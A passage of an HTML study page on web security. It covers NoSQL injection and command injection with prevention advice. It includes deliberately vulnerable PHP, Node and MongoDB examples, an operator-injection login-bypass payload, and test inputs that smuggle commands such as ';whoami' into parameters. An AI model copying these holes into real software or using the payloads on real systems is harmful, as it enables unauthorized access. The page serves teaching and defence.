                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">More Techniques &rarr;</h2>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                  <a href="https://www.notion.so/UNION-SQLI-1a227bcaaa968024b73afdc2146ed254?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">UNION SQLI <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Subverting-Query-Logic-2e627bcaaa968075b5fed977afaad9f4?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Subverting Query Logic <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/error-based-SQLI-1a827bcaaa9680ea94e2d412e84ce1f3?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Error based SQLI <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Blind-SQLI-1b427bcaaa968049b377c70c429d8f15?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Blind SQLI <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Out-OF-Band-SQLI-1b427bcaaa968061a4f0f69b68597113?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Out-OF-Band SQLI <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Second-Order-SQLI-Stored-SQLI-1ce27bcaaa9680259796c4ed9214af1e?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Second Order SQLI (Stored) <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Filter-Evasion-Techniques-1ce27bcaaa9680fea4fce5c925df9fe9?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Filter Evasion Techniques <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Other-Techniques-1ce27bcaaa968086a4e1edfc8fff3840?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Other Techniques <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/vulnerable-and-secure-code-SQLI-1a227bcaaa96801b80d6cee44458ee87?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vuln &amp; Secure Code <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                </div>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 20px; margin-bottom: 20px;">Study Resources &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><a href="https://www.notion.so/Study-Resources-25e27bcaaa96803ab953ceda4e553660?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline;">Study Resources</a></li>
                  <li style="margin-bottom: 10px;"><a href="https://www.notion.so/Writeups-25927bcaaa9680078b7cd34d75da032c?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline;">Writeups</a></li>
                  <li style="margin-bottom: 10px;"><a href="https://www.notion.so/Notes-1cf27bcaaa9680e2a930f1138bad1100?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline;">Notes</a></li>
                  <li style="margin-bottom: 10px;"><a href="https://www.notion.so/Tools-25927bcaaa9680eaa99fdf0f3becf6af?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline;">Tools</a></li>
                </ul>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              NoSQL DB
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div
              style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <p style="font-size: 1.2rem; margin-bottom: 20px;">
                  <a href="https://www.notion.so/NoSQL-DB-1ba27bcaaa9680618960f17b53b41f75?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: bold; font-size: 1.4rem;">NoSQL DB Resource</a>
                </p>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Vulnerability occur in web applications that use NoSQL DB.</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Attacker inject malicious input that manipulate NoSQL query leading to <strong>unautorised access, data leakage, and unintended operations</strong></li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; attacker exploit weakness in application handling of user input that allow attacker to manipulate NoSQL query.</p>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Types of NoSQL Injection &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) Syntax injection &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">break syntax of NoSQL query, enable u to inject ur own payload.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) Operator injection &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">when use NoSQL query operators to manipulate queries.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Impact of NoSQL Injection &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">unauthorized access.</li>
                  <li style="margin-bottom: 10px;">data leakage</li>
                  <li style="margin-bottom: 10px;">unintended operations</li>
                  <li style="margin-bottom: 10px;">bypass authentication and protection mechanisms</li>
                  <li style="margin-bottom: 10px;">DOS</li>
                  <li style="margin-bottom: 10px;">Extract or edit data</li>
                  <li style="margin-bottom: 10px;">Execute code on server</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to Prevent NoSQL Injection &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; we recommend reading the security documentation for your NoSQL database of choice.</p>
                
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>That said, the following broad guidelines will also help &rarr;</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Sanitize and validate user input, using an allow-list of accepted characters.</li>
                  <li style="margin-bottom: 10px;">Insert user input using parameterized queries instead of concatenating user input directly into the query.</li>
                  <li style="margin-bottom: 10px;">To prevent operator injection, apply an allowlist of accepted keys.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; NoSQL Injection Example &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Let's assume we have a web application that uses MongoDB as its NoSQL database backend.</li>
                  <li style="margin-bottom: 10px;">The application has a login functionality where users provide their username and password.</li>
                  <li style="margin-bottom: 10px;">The application performs a query to check if the provided credentials are valid</li>
                </ul>

                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">var username = getRequestParameter("username"); // User-supplied input
var password = getRequestParameter("password"); // User-supplied input

// MongoDB query
var query = {
    username: username,
    password: password
};
// Perform query to check if credentials are valid
var result = db.users.findOne(query);
if (result) {
    // Login successful
} else {
    // Login failed
}</code>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">In this example, the application constructs a MongoDB query using usersupplied values for the username and password fields. If an attacker intentionally provides a specially crafted value, they could potentially exploit a NoSQL injection vulnerability.</li>
                  <li style="margin-bottom: 10px;">For instance, an attacker might enter the following value as the username parameter &rarr;</li>
                </ul>

                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">username: { $gt: "" }</code>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">In a normal scenario, the query would search for a user with the exact username provided.</li>
                  <li style="margin-bottom: 10px;">However, in this case, the attacker is using the $gt operator (greater than) with an empty string as the value.</li>
                  <li style="margin-bottom: 10px;">This can manipulate the query's logic, causing it to retrieve a user record that the attacker should not have access to.</li>
                  <li style="margin-bottom: 10px;">The attacker could potentially bypass the login mechanism and gain unauthorized access.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Payloads &rarr;</h2>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0; font-size: 1.2rem;">
                  &rarr; payload all the things &rarr;<br>
                  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" style="color: #2563eb; text-decoration: underline; word-break: break-all;">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</a>
                </div>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Attacks &rarr;</h2>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                  <a href="https://www.notion.so/1-NoSQL-syntax-injection-2f727bcaaa9680e889f4c3d6240005ba?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">(1) NoSQL syntax injection <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/2-NoSQL-operator-injection-2f727bcaaa9680e2b5a8d7e088d3da45?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">(2) NoSQL operator injection <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/3-Timing-based-injection-2f727bcaaa9680069c66d32014a5277d?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">(3) Timing based injection <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                </div>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 20px; margin-bottom: 20px;">Study Resources &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><a href="https://www.notion.so/Writeups-2f727bcaaa9680188d61f9a9f0f1e363?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline;">Writeups</a></li>
                  <li style="margin-bottom: 10px;"><a href="https://www.notion.so/Notes-2f727bcaaa9680978977d30a95aed39b?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline;">Notes</a></li>
                  <li style="margin-bottom: 10px;"><a href="https://www.notion.so/Tools-2f727bcaaa9680d3a919cdc4891f7559?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline;">Tools</a></li>
                </ul>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Command Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div
              style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Web Security Vulnerability that allow
                    attacker Inject and execute commands on server.</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">also known as RCE (Remote Code Execution).</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; All web programming languages have different
                  functions that enable the developer to execute operating system commands directly on the back-end
                  server whenever they need to &rarr;</p>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">a web application written in <code>PHP</code> may use the
                    <code>exec</code>, <code>system</code>, <code>shell_exec</code>, <code>passthru</code>, or
                    <code>popen</code> functions to execute commands directly on the back-end server</li>
                </ul>
                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?&gt;</code>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">a web application is developed in <code>NodeJS</code>, a developer
                    use <strong><code>child_process.exec</code> OR</strong> <code>child_process.spawn</code> for the
                    same purpose.</li>
                </ul>
                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})</code>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Causes &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) &rarr;
                  donÃ¢â‚¬â„¢t Validate OR Sanitize user input &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">app directly use user input in system commands without validation
                  </li>
                  <li style="margin-bottom: 10px;">Failing to escape special characters (<code>;</code>, <code>|</code>,
                    <code>&amp;</code>, etc.) means attackers can inject arbitrary commands.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) &rarr;
                  using unnecessary shell/system calls &lt; Shell execution functions &gt; &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Developers often use functions like <code>system()</code>,
                    <code>exec()</code>, <code>shell_exec()</code>, or <code>os.system()</code> to perform tasks and
                    pass user input to it</li>
                  <li style="margin-bottom: 10px;">This opens a door for user input to reach the OS directly.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr;
                  Example &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">applications often use functions in programming languages such as
                    PHP, Python and NodeJS to pass data to and to make system calls on the machineÃ¢â‚¬â„¢s operating system.
                    For example, taking input from a field and searching for an entry into a file. Take this code
                    snippet below as an example:</li>
                </ul>

                <div
                  style="background-color: var(--color-dark, #1f2937); color: var(--color-white, #ffffff); padding: 25px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0;">
                  <p><strong>1.</strong> The application stores MP3 files in a directory contained on the operating
                    system.</p>
                  <p><strong>2.</strong> The user inputs the song title they wish to search for. The application stores
                    this input into the <code>$title</code> variable.</p>
                  <p><strong>3.</strong> The data within this <code>$title</code> variable is passed to the command
                    <code>grep</code> to search a text file named <em>songtitle.txt</em> for the entry of whatever the
                    user wishes to search for.</p>
                  <p><strong>4.</strong> The output of this search of <em>songtitle.txt</em> will determine whether the
                    application informs the user that the song exists or not.</p>
                </div>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Impact &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; RCE
                  &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Attackers can execute arbitrary commands with the privileges of the
                    web server process. This can lead to unauthorized data access, code execution, or system compromise.
                  </li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr;
                  Data Exfiltration &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Attackers can exfiltrate sensitive data, such as database content,
                    files, or system configurations.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr;
                  System Manipulation &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Attackers may manipulate the server, install malware, or create
                    backdoors for future access.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4 &rarr;
                </h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Critical severity</strong> (CVSS score often "Critical").
                  </li>
                  <li style="margin-bottom: 10px;">Affects the <strong>CIA triad</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li><strong>Confidentiality</strong>: Read sensitive files (e.g., <code>/etc/passwd</code>).</li>
                      <li><strong>Integrity</strong>: Modify files or data.</li>
                      <li><strong>Availability</strong>: Delete files or crash the system.</li>
                    </ul>
                  </li>
                </ul>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Remediation and how to prevent CMDI &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. System
                  Commands &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">We should always avoid using functions that execute system commands,
                    especially if we are using user input with them.</li>
                  <li style="margin-bottom: 10px;">Instead of using system command execution functions, we should use
                    built-in functions that perform the needed functionality, as back-end languages usually have secure
                    implementations of these types of functionalities. For example, suppose we wanted to test whether a
                    particular host is alive with <code>PHP</code>. In that case, we may use the <code>fsockopen</code>
                    function instead, which should not be exploitable to execute arbitrary system commands.</li>
                  <li style="margin-bottom: 10px;">If we needed to execute a system command, and no built-in function
                    can be found to perform the same functionality, we should never directly use the user input with
                    these functions but should always validate and sanitize the user input on the back-end. Furthermore,
                    we should try to limit our use of these types of functions as much as possible and only use them
                    when there's no built-in alternative to the functionality we require.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. Input
                  Validation &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Input validation is done to ensure it matches the expected format for
                    the input</li>
                  <li style="margin-bottom: 10px;">input validation should be done both on the front-end and on the
                    back-end.</li>
                  <li style="margin-bottom: 10px;">&rarr; In <code>PHP</code>, like many other web development
                    languages, there are built in filters for a variety of standard formats, like emails, URLs, and even
                    IPs, which can be used with the <code>filter_var</code> function,</li>
                </ul>
                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">&rarr; If we wanted to validate a different non-standard format, then
                    we can use a Regular Expression <code>regex</code> with the <code>preg_match</code> function</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. Input
                  Sanitization &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>means removing any non-necessary special characters from the
                      user input</strong></li>
                  <li style="margin-bottom: 10px;">Input sanitization is always performed after input validation.</li>
                  <li style="margin-bottom: 10px;">Even after we validated that the provided user input is in the proper
                    format, we should still perform sanitization and remove any special characters not required for the
                    specific format</li>
                  <li style="margin-bottom: 10px;">&rarr; we should use built-in functions to remove any special
                    characters. We can use <code>preg_replace</code> to remove any special characters from the user
                    input &rarr;</li>
                </ul>
                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">As we can see, the above regex only allows alphanumerical characters
                    (<code>A-Za-z0-9</code>) and allows a dot character (<code>.</code>) as required for IPs. Any other
                    characters will be removed from the string.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4. Server
                  Configuration &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">&rarr; we should make sure that our back-end server is securely
                    configured to reduce the impact in the event that the webserver is compromised</li>
                  <li style="margin-bottom: 10px;">Use the web server's built-in Web Application Firewall (e.g., in
                    Apache <code>mod_security</code>), in addition to an external WAF (e.g. <code>Cloudflare</code>,
                    <code>Fortinet</code>, <code>Imperva</code>..)</li>
                  <li style="margin-bottom: 10px;">Abide by the <a
                      href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Principle of Least Privilege (PoLP)</a> by
                    running the web server as a low privileged user (e.g. <code>www-data</code>)</li>
                  <li style="margin-bottom: 10px;">Prevent certain functions from being executed by the web server
                    (e.g., in PHP <code>disable_functions=system,...</code>)</li>
                  <li style="margin-bottom: 10px;">Limit the scope accessible by the web application to its folder (e.g.
                    in PHP <code>open_basedir = '/var/www/html'</code>)</li>
                  <li style="margin-bottom: 10px;">Reject double-encoded requests and non-ASCII characters in URLs</li>
                  <li style="margin-bottom: 10px;">Avoid the use of sensitive/outdated libraries and modules (e.g. <a
                      href="https://www.php.net/manual/en/install.unix.commandline.php" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">PHP CGI</a>)</li>
                </ul>

                <div
                  style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <ul style="font-size: 1.2rem; padding-left: 20px; list-style-type: disc; margin: 0;">
                    <li style="margin-bottom: 10px;"><strong>Avoid Using Function Executing System Commands</strong>
                    </li>
                    <li style="margin-bottom: 10px;"><strong>Input Validation</strong>: Validate inputs against a
                      whitelist of allowed values (e.g., only numbers or alphanumeric characters) and reject special
                      characters like <code>;</code>, <code>&amp;</code>, <code>|</code>.</li>
                    <li style="margin-bottom: 10px;"><strong>Sanitization</strong>: Escape special characters if system
                      commands are unavoidable.</li>
                    <li style="margin-bottom: 10px;"><strong>Use Web Application Firewalls (WAFs)</strong>: Deploy WAFs
                      to filter malicious inputs, though this is a mitigation, not a fix.</li>
                    <li style="margin-bottom: 10px;"><strong>Limit Privileges</strong>: Run applications with minimal
                      privileges to reduce the impact of successful exploits.</li>
                    <li style="margin-bottom: 10px;"><strong>Regular Scanning</strong>: Use DAST and Static Application
                      Security Testing (SAST) tools to identify vulnerabilities during development and testing.</li>
                  </ul>
                </div>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Where to Test for Command Injection &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">To identify command injection vulnerabilities, focus
                  on testing entry points where user input is processed and potentially passed to system commands.
                  Common areas to test include:</p>

                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 15px;"><strong>URL Parameters</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Test query string parameters in GET requests (e.g.,
                        <code>?cmd=payload</code>, <code>?host=127.0.0.1;whoami</code>).</li>
                      <li style="margin-bottom: 5px;">Example: If a URL like
                        <code>http://vulnerable-site.com/ping.php?address=192.168.2.2</code> executes a
                        <code>ping</code> command, try injecting <code>192.168.2.2;whoami</code> to check for additional
                        command execution.</li>
                      <li style="margin-bottom: 5px;">Common vulnerable parameters: <code>cmd</code>, <code>exec</code>,
                        <code>command</code>, <code>execute</code>, <code>ping</code>, <code>query</code>,
                        <code>run</code>, etc.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Form Inputs</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Test input fields in forms (e.g., search boxes, feedback forms, or
                        file upload fields) that may pass data to system commands.</li>
                      <li style="margin-bottom: 5px;">Example: A search form that processes user input for a system
                        command like <code>cat</code> or <code>grep</code> could be vulnerable if you input
                        <code>search_term;ls</code>.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>HTTP Headers</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
